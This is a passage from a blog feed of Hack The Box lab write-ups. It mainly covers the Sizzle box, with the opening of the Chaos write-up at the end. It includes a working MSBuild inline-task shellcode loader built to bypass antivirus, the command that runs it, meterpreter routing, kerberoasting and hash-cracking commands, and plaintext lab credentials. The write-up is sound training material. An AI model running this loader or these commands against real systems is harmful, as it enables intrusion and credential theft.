0xc9,0x2c,0x5a,0x32,0x23,0x56,0x46,0x00,0xdc,0x8e,0x00,0x4c,0xe0,0x1a,0x04,
0xd5,0x04,0x1b,0xee,0xc5,0x90,0x2d,0x9f,0x68,0xf5,0x11,0x48,0xcf,0x2d,0x85,
0xef,0xe9,0x2b,0xc8,0x3f,0xf3,0x07,0x12,0xd7,0x23,0x93,0x5f,0x2d,0xab,0xe3,
0x9a,0x37,0x42,0xf1,0xd2,0x7e,0xdc,0x6c,0x30,0x35,0x75,0xf6,0x1a,0x1c,0x8f,
0x59,0x92,0x38,0xc7,0xb7,0x05,0xbd,0x76,0x31,0x21,0x6f,0x4c,0x6f,0x54,0xde,
0x5e,0x4a,0xb0,0x1d,0xec,0xcb,0xd2,0x13,0x28,0xcc,0xf7,0xd8,0x13,0xac,0xcf,
0x03,0x34,0xd7,0x4d,0xa2,0xdf,0x21,0x84,0x1d,0xf5,0xcc,0x64,0x8f,0x97,0xd7,
0x2b,0xa2,0x89,0xb4,0x6e,0x8d,0xb0,0x0b,0xc0,0x09,0x43,0xa2,0xbe,0x97,0xe5,
0x1d,0x58,0xe0,0x3f,0xb5,0xe5,0xe2,0xc0,0x3a,0x8e,0x2e,0xfc,0x90,0x2a,0x06,
0xaa,0xe4,0x97,0x53,0x70,0x70,0xa4,0xf2,0xce,0x8f,0x11,0x57,0x05,0xe4,0x39,
0x4c,0xf2,0x7b,0x1a,0x45,0xd1,0xce,0xc9,0xf4,0x20,0xf2,0xbd,0x13,0xdf,0xc2,
0x65,0xd0,0x5c,0x4e,0x77,0xe4,0x59,0x3d,0xa5,0xb5,0x8b,0x05,0x6d,0x9d,0x61,
0x72,0x17,0xde,0x9c,0xfd,0x4d,0x30,0x8a,0x51,0xa8,0xf6,0x47,0x85,0xff,0x7e,
0x74,0x88,0x8b,0x10,0xa1,0xee,0xaf,0xef,0xb5,0x53,0xe2,0x5c,0x36,0x8a,0x54,
0xa0,0xf5,0xd0,0x4b,0x5f,0x0e,0x74,0x49,0x72,0x9e,0xc5,0x66,0xbd,0xca,0x2d,
0x20,0x16,0x16,0x1c,0x83,0x59,0x08,0xbb,0x5b,0x1d,0x8f,0x91,0xda,0xb5,0xa7,
0xe6,0xda,0xb7,0xfb,0x8a,0x32,0xc3,0x2f,0x73,0xe0,0x27,0x4c,0x07,0x19,0x49,
0xf8,0x55,0xba,0x69,0x64,0xf9,0xad,0xd5,0x2a,0xa5,0xab,0xfd,0x3b,0x5c,0x7d,
0x73,0xc7,0xf9,0x65,0x62,0xc3,0xc6,0xd7,0x3f,0x10,0x9e,0x0d,0x35,0x52,0xb7,
0x4e,0x17,0xdf,0x7d,0x59,0x47,0xfb,0xf1,0x02,0x58,0x25,0xf6,0xe9,0x59,0x9c,
0xf6,0x70,0xc4,0x19,0x66,0x01,0x81,0xb5,0xde,0x7a,0x28,0xbf,0x45,0x66,0xc5,
0x96,0x7e,0x55,0x09,0x21,0x58,0x7c,0xcf,0x34,0x66,0x67,0x9e,0xd3,0x55,0x63,
0x3f,0x01,0x1f,0x14,0x42,0x4b,0x29,0xca,0x89,0x27,0xc7,0x0f,0x77,0xb0,0xe6,
0x13,0x3d,0x37,0x15,0xc0,0x2b,0x5e,0x40,0x20,0x86,0x30,0x0d,0xc5,0x46,0x98,
0xab,0xb0,0x2b,0x92,0xc5,0x22,0x21,0x92,0xf6,0x1c,0x03,0x27,0x0a,0x7c,0x84,
0x4b,0x54,0x0a,0xf3,0x6e,0xc6,0x50,0xe5,0xf6,0x28,0x9b,0x7d,0xa5,0xa3,0x21,
0x75,0xaa,0xb0,0xd7,0xf3,0xa0,0xa5,0xd0,0x7f,0x90,0x75,0xf1,0x16,0x8b,0x98,
0x70,0x15,0x5a,0xc5,0x58,0x38,0xc1,0xaf,0x87,0xbb,0xce,0x65,0x2f,0x6d,0xb1,
0x2d,0x69,0x47,0x4d,0x34,0xf9,0x02,0xb9,0x66,0x4f,0x93,0xe2,0x7c,0x26,0x76,
0x01,0x12,0x1e,0x86,0x81,0x69,0x8d,0xa5,0x31,0x67,0x1b,0x61,0x5b,0x02,0xb4,
0x21,0xa9,0x70,0xbe,0xbb,0x23,0x22,0x6d,0x1d,0xc8,0x19,0x23,0x41,0xfc,0x6c,
0x41,0x12,0x17,0xbf,0x99,0x4e,0x9c,0xc2,0x5c,0x18,0xbf,0xcc,0x1a,0xb4,0x2d,
0x9e,0x26,0xa5,0x7d,0x1e,0xdc,0x50,0x1f,0xd9,0x0a,0x79,0xf3,0x29,0x16,0xb6,
0x49,0xda,0x55,0x51,0xc9,0x54,0x2e,0x46,0x68,0x9b,0xec,0x3b,0xd4,0x61,0x27,
0x50,0x3a,0x47,0x74,0x62,0x07,0x0f,0x83,0xcd,0xc2,0x26,0x20,0xb7,0xa3,0xd7,
0x0e,0xa6,0x6c,0xfd,0xb0,0x2f,0xd5,0x0f,0x6f,0x35,0x5d,0x4f,0x2b,0x14,0xe7,
0xca,0x6f,0x78,0x0e,0xfb,0x09,0x5c,0x25,0x0c,0x99,0xc4,0xa5,0x92,0x30,0x3e,
0xbb,0x4c,0x46,0xa9,0xa0,0xe6,0xf0,0x75,0x12,0xad,0x6c,0xc1,0xef,0xcc,0xf2,
0x67,0x5f,0x22,0xff,0xa1,0x53,0xad,0xc5,0x57,0x8b,0xcc,0x0a,0xd5,0x94,0xa8,
0x91,0x41,0xc2,0x47,0xd5,0xa1,0x27,0x1f,0x0b,0x47,0x2d,0xa8,0xf4,0xc6,0xdb,
0x5d,0x17,0x36,0x44,0x23,0x26,0x30,0xa8,0xd6,0x97,0x93,0xf2,0x48,0x7c,0x34,
0xbd,0x94,0xb9,0xa2,0x5e,0x78,0x66,0xde,0xbf,0x31,0x7e,0x5a,0x7f,0xbc,0xe9,
0xaa,0x7a,0x00,0xaa,0x8f,0xc8,0x15,0x65,0x84,0x6c,0x1e,0x95,0x43,0xc3,0x82,
0x0a,0x65,0x16,0x73,0xe3,0x47,0xe6,0xfa,0x62,0x80,0x9f,0xa9,0x28,0x8c,0x4c,
0xbd,0xe2,0xbb,0x82,0x8b,0xd1,0x80,0x00,0x84,0x6d,0x8d,0x80,0x4e,0x7d,0xce,
0x84,0x91,0x94,0x74,0x8c,0x30,0xc9,0x49,0x59,0x7b,0x9c,0x0d,0x06,0x60,0x3d,
0x12,0xaf,0x55,0x33,0x12,0x51,0xcb,0x05,0x53,0x8b,0x29,0xcb,0xd5,0xd2,0x00,
0xc7,0x73,0xda,0x2a,0x5a,0x6d,0x34,0xed,0x5d,0x61,0xec,0xb0,0xe6,0x0a,0x23,
0x61,0xa9,0xd5,0x1d,0x97,0x01,0x0b,0x98,0xfe,0x8b,0xad,0x16,0x2e,0x96,0x87,
0xd8,0x86,0xc3,0x46,0xeb,0xd0,0x41,0x6c,0x10,0xa4,0xd2,0xdf,0x07,0x4e,0x7f,
0x65,0x66,0x99,0x40,0x5f,0xdb,0x8d,0x85,0xd4,0x0d,0x1a,0xe3,0x5f,0x3a,0x38,
0x5c,0x4e,0xeb,0xa1,0x5a,0xfc,0x46,0x78,0xc6,0xa6,0x3d,0x6a,0x04,0x2a,0x07,
0xf5,0x3d,0xac,0x08,0xe9,0x22,0x13,0xa9,0x75,0x78,0x81,0xd1,0x3c,0x93,0x4b,
0x44,0x18,0x8b,0xfa,0xef,0xa2,0xb4,0x91,0x52,0xae,0x4b,0xae,0xf2,0x8e,0xdf,
0xac,0x96,0xf1,0xde,0x18,0x40,0x5f,0x13,0x5c,0xe6,0xa8,0x39,0x04,0x05,0x00,
0x53,0xfb,0x69,0x4c,0x93,0x0a,0x88,0x25,0x28,0xbc,0xdd,0xde,0xc6,0xcf,0x55,
0x7e,0x7b,0xef,0x95,0x34,0x6b,0x0d,0x04,0x4d,0x02,0xd9,0x6e,0x86,0xce,0xf0,
0x2d,0xd8,0x79,0x68,0xde,0x1c,0xe7,0xf5,0xc4,0x94,0x38,0xc4,0x6a,0xdd,0x2a,
0x37,0x7c,0xfe,0x42,0x2a,0x5d,0xf3,0xae,0xeb,0x09,0x99,0xfa,0x52,0xc4,0x9c,
0x67,0xd7,0x33,0x8b,0x3d,0xc3,0xa3,0x95,0x5d,0x3c,0x83,0x3b,0xcf,0x23,0x25,
0x7f,0xbe,0x42,0x11,0xb8,0x44,0xba,0xf5,0xf7,0xfa,0x76,0xfb,0xe8,0xc5,0x74,
0xa8,0x7e,0x5b,0xef,0xa7,0x98,0x54,0x6f,0x81,0x5f,0x72,0x9f,0x89,0xc1,0xcc,
0x7d,0x93,0xa8,0xee,0x2c,0x41,0x8f,0x09,0xbe,0x3f,0x9e,0xc5,0x9c,0x73,0xaf,
0xe3,0x38,0x67,0x5e,0xa8,0x01,0xd7,0xce,0x5b,0xcb,0x63,0xfc,0x11,0x52,0xbc,
0x5e,0xc8,0xa6,0x79,0x54,0x65,0xf0,0xcf,0xe0,0x10,0xbd,0x90,0x4f,0x89,0xde,
0xd0,0x8c,0xbd,0xbb,0x61,0x46,0xd6,0x5e,0xff,0x90,0x32,0x77,0x0a,0xb4,0x7f,
0x84,0xee,0xbc,0x91,0x62,0x12,0x9d,0x29,0x02,0xcd,0x64,0x3a,0x35,0x06,0x49,
0x4d,0xa3,0xe5,0x00,0x88,0x5f,0xc0,0xa3,0x07,0xcb,0xc7,0x61,0x1b,0x36,0x19,
0x0e,0xe3,0x28,0x35,0x8e,0xa2,0xc3,0xc0,0xa1,0xc9,0x50,0x34,0xe8,0xb4,0x85,
0x9a,0x8d,0x12,0xe3,0x4d,0xaa,0xcb,0x5c,0x5c,0xc8,0xe2,0xcb,0xe9,0x44,0x68,
0x3a,0x82,0x1c,0x53,0xf6,0x54,0xab,0xda,0x85,0xb8,0x9e,0x3a,0xd8,0xce,0x33,
0x13,0xc4,0x24,0xed,0x99,0x83,0xfb,0xb0,0x90,0x63,0xc2,0xa8,0x97,0xbc,0x40,
0xe7,0xc9,0x6d,0x17,0x58,0x54,0xf6,0x72,0x63,0x3a,0x41,0x43,0xe3,0xa6,0xbc,
0x2d,0xd3,0xe0,0x0c,0x9a,0x10,0xcf,0x7a,0x3c,0xad,0xcf,0x6b,0x39,0xb2,0x74,
0x3e,0xef,0xd9,0xc7,0xe7,0x2e,0x46,0x7e,0xb8,0xd6,0x2a,0x54,0x47,0x59,0x0c,
0xe1,0x18,0x90,0xd1,0xa0,0x00,0x76,0x59,0x14,0x86,0xe5,0xb6,0x31,0xf4,0x9b,
0xea,0x01,0x43,0xf0,0x8c,0xc9,0x36,0x9d,0x9d,0x40,0xe1,0x0f,0xcc,0xdd,0xb6,
0x8f,0x49,0xfa,0x2c,0x89,0xb8,0x4e,0x7b,0x18,0x25,0x60,0x7e,0x7f,0x54,0xcc,
0xfa,0x07,0x7a,0x67,0x72,0xb3,0x89,0xf8,0x66,0x41,0x6b,0x34,0x03,0x11,0x12,
0xd1,0xdd,0x39,0x36,0x30,0x23,0xdf,0x87,0xa2,0x65,0x61,0x66,0x1f,0x54,0x3f,
0x46,0xb5,0x74,0x71,0xb9,0x38,0x8a,0xb4,0xa0,0xfc,0x3c,0x43,0xec,0x51,0xc6,
0x6f,0xab,0xde,0x4d,0xd1,0x7e,0x45,0xb5,0x08,0x85,0x41,0x25,0x58,0x02,0x26,
0xdf,0x24,0xcd,0x06,0x41,0x4f,0x96,0xe4,0x13,0x43,0xc0,0x05,0xf7,0xac,0x31,
0x89,0x1d,0x42,0x7d,0x47,0x83,0x3b,0x41,0x64,0xc2,0xba,0x3b,0x38,0xdb,0xde,
0x32,0x26,0x3c,0xe7,0xab,0x5c,0x01,0x37,0x35,0x32,0x1a,0x25,0xa2,0x30,0x69,
0xf0,0x2c,0xfe,0x5a,0x9b,0x94,0xc7,0x3d,0xfb,0x37,0x74,0x4e,0x58,0xef,0x78,
0xd6,0xdf,0xbd,0x18,0x34,0x09,0xd4,0x6d,0xca,0x47,0xb6,0xbf,0x77,0xf8,0x31,
0x2b,0xc2,0x1f,0xf9,0x93,0x98,0xaf,0xe5,0x86,0xe3,0x35,0xc6,0x57,0xdf,0x17,
0x1d,0x0a,0xec,0x3e,0x45,0xb2,0xc8,0xa8,0x45,0x70,0xc2,0x8d,0xe8,0x05,0x68,
0xb2,0xd1,0x36,0x67,0x63,0xd6,0xa9,0x82,0x99,0x14,0x98,0x45,0xc1,0x3c,0x87,
0x21,0xb2,0x6c,0x71,0x72,0xb1,0x80,0x11,0x74,0x05,0xed,0x15,0x96,0x88,0x9b,
0x44,0x16,0x10,0xa7,0x00,0x02,0xf2,0x77,0xa5,0xc1,0xdf,0xe3,0xd9,0xd6,0xf9,
0xfd,0xb0,0x27,0x0a,0x07,0x31,0xf4,0x4f,0x22,0x7d,0xc1,0x20,0xbd,0x87,0x30,
0x99,0xd9,0x52,0xcf,0xa4,0x79,0x10,0x01,0x33,0x59,0xc9,0x89,0xa6,0xd5,0xb8,
0xd0,0xe7,0x80,0x7b,0xe4,0xc3,0x3b,0x9d,0x9c,0x9d,0x9c,0xea,0xba,0xab,0x54,
0x4a,0x87,0xe1,0x7d,0x71,0xe9,0xe9,0xbb,0xd9,0x17,0xdc,0xd3,0x3f,0xbf,0x4c,
0x7f,0xcd,0xde,0xa0,0x64,0x41,0x20,0xb4,0x24,0x30,0x57,0xcf,0xe8,0x04,0xc2,
0xe4,0x7c,0xb2,0xa5,0x28,0x33,0x6c,0xe8,0x7b,0x9a,0xac,0xc9,0x0c,0xb3,0xb7,
0x48,0xbd,0xb3,0x6a,0xf1,0xfc,0x31,0xcb,0x21,0x39,0x32,0x97,0x7b,0x3c,0x9e,
0x66,0xfa,0xca,0xfe,0xa3,0xcb,0x41,0x2f,0x0f,0x4b,0x6d,0x0b,0x54,0x78,0x2e,
0x85,0x51,0xa5,0x51,0x76,0xef,0xf5,0xf3,0xa7,0xff,0x4a,0x5f,0x7b,0x8d,0xb0,
0x15,0x85,0x78,0xbb,0xd3,0x0a,0x21,0x46,0x3f,0xeb,0x6c,0x9b,0xed,0xd5,0x80,
0xaa,0xf2,0x6b,0x48,0xb1,0x88,0x39,0x3c,0xa8,0x68,0x50,0x06,0xb5,0xa5,0x23,
0x6c,0x8e,0x0c,0xa5,0x95,0x38,0x45,0xfc,0xf5,0xe8,0x7a,0xcb,0xf6,0x91,0xd9,
0xbc,0x9a,0x4b,0x1a,0x60,0xb1,0xc6,0xa7,0xc5,0x0e,0x4b,0xc1,0x74,0xc7,0x74,
0x0e,0xe2,0xdb,0xca,0xce,0xee,0xf4,0x5d,0x80,0xa6,0x7f,0x05,0x8c,0xf1,0xa4,
0x63,0x5e,0xd2,0xca,0xb0,0xc0,0xd1,0xb8,0xb1,0x22,0x8e,0x26,0xac,0x55,0xd4,
0x41,0x36,0x42,0xff,0xb6,0xfc,0x87,0x62,0xfe,0x8b,0x4f,0x47,0x83,0xc4,0x93,
0x38,0x7c,0xfb,0x55,0xa3,0xd8,0xc2,0x53,0x1f,0x27,0x47,0x75,0x56,0xfc,0xcd,
0xc9,0x9e,0x08,0xfe,0x35,0x74,0x2a,0xf3,0x27,0x22,0xad,0x8e,0x41,0xde,0xb6,
0xf2,0xf2,0xe8,0xb7,0x82,0x3b,0x66,0x38,0x95,0x46,0x4e,0x35,0x75,0x48,0x86,
0xab,0xdd,0x43,0x08,0xc7,0xcd,0x29,0xac,0x20,0xb5,0x3a,0x75,0x5f,0x39,0x85,
0xf1,0xd4,0xd4,0xf6,0xb6,0x35,0x65,0xc4,0x57,0x05,0x69,0x90,0x9a,0xfb,0x18,
0xee,0x0d,0xd3,0x02,0xae,0x40,0x38,0xac,0xaa,0x40,0x4c,0x9c,0xc9,0x3a,0xca,
0x24,0x09,0xe7,0x0c,0x8c,0x68,0xb5,0x66,0x61,0x78,0xf2,0xd0,0x29,0xea,0x33,
0xeb,0xb5,0x4d,0xc4,0xc8,0x8e,0xf1,0x28,0xdf,0xed,0xee,0xe9,0x29,0xc5,0x91,
0xea,0x1f,0x7d,0x47,0xbd,0xf9,0xde,0x66,0x58 };


              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]&amp;gt;
      &amp;lt;/Code&amp;gt;
    &amp;lt;/Task&amp;gt;
  &amp;lt;/UsingTask&amp;gt;
&amp;lt;/Project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-time-it-worked-and-i-got-meterpreter-&quot;&gt;This time it worked and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kerberoasting-privilege-escalation&quot;&gt;Kerberoasting, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-a-meterpreter-session-we-can-route-the-internal-subnet-use-a-proxy-then-use-getuserspnspy-and-see-if-any-user-is-kerberoastable-this-technique-is-covered-here&quot;&gt;Now we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session, we can route the internal subnet, use a proxy then use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; and see if any user is kerberoastable. This technique is covered &lt;a href=&quot;https://www.blackhillsinfosec.com/a-toast-to-kerberoast/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-is-to-configure-proxychains-to-use-port-8080-&quot;&gt;First thing is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use port 8080 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route set up the proxy :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;route add 10.10.10.0 255.255.255.0 1&lt;/code&gt; this adds a route of the whole internal subnet where &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is the session number.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-are-ready-lets-kerberoast-&quot;&gt;Now we are ready. Let’s kerberoast !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;user-mrlky-was-kerberoastable-and-we-got-a-hash-lets-pass-it-to-john-&quot;&gt;User &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; was kerberoastable and we got a hash, let’s pass it to &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-football7-now-we-can-use-secretdumppy-again-and-do-the-same-thing-we-did-before-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;secretdump.py&lt;/code&gt; again and do the same thing we did before :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/43.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/45.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Active Directory" /><category term="Windows Exploitation" /><category term="Networking" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/sizzle/0.png" /></entry><entry><title type="html">Hack The Box - Chaos</title><link href="http://localhost:4000/hack-the-box/chaos/" rel="alternate" type="text/html" title="Hack The Box - Chaos" /><published>2019-05-25T00:00:00+02:00</published><updated>2019-05-25T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/chaos</id><content type="html" xml:base="http://localhost:4000/hack-the-box/chaos/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-chaos-retired-and-heres-my-write-up-about-it-chaos-was-a-ctf-style-machine-i-cant-say-that-it-simulated-a-real-life-situation-i-had-fun-solving-this-box-some-steps-were-straightforward-others-were-very-tricky-about-main-steps-to-get-an-initial-shell-as-www-data-we-will-exploit-a-web-application-that-used-latex-after-that-we-will-escalate-privileges-to-another-user-and-escape-rbash-for-root-privilege-escalation-we-will-extract-root-credentials-from-a-firefox-profile-and-get-a-root-shell-its-a-linux-box-and-its-ip-is-101010120-i-added-it-to-etchosts-as-chaoshtb-lets-jump-right-in&quot;&gt;Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; we will exploit a web application that used &lt;a href=&quot;https://en.wikipedia.org/wiki/LaTeX&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LaTeX&lt;/code&gt;&lt;/a&gt;. After that we will escalate privileges to another user and escape &lt;code class=&quot;highlighter-rouge&quot;&gt;rbash&lt;/code&gt;. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.120&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;chaos.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/chaos/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC chaos.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/chaos/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-some-ports-http-on-port-80-and-10000-email-related-services-imap-pop3-running-on-ports-110-143-993-and-995-lets-check-http&quot;&gt;We got some ports. &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on port 80 and 10000, email related services (&lt;code class=&quot;highlighter-rouge&quot;&gt;imap&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;pop3&lt;/code&gt;) running on ports 110, 143, 993 and 995. Let’s check &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

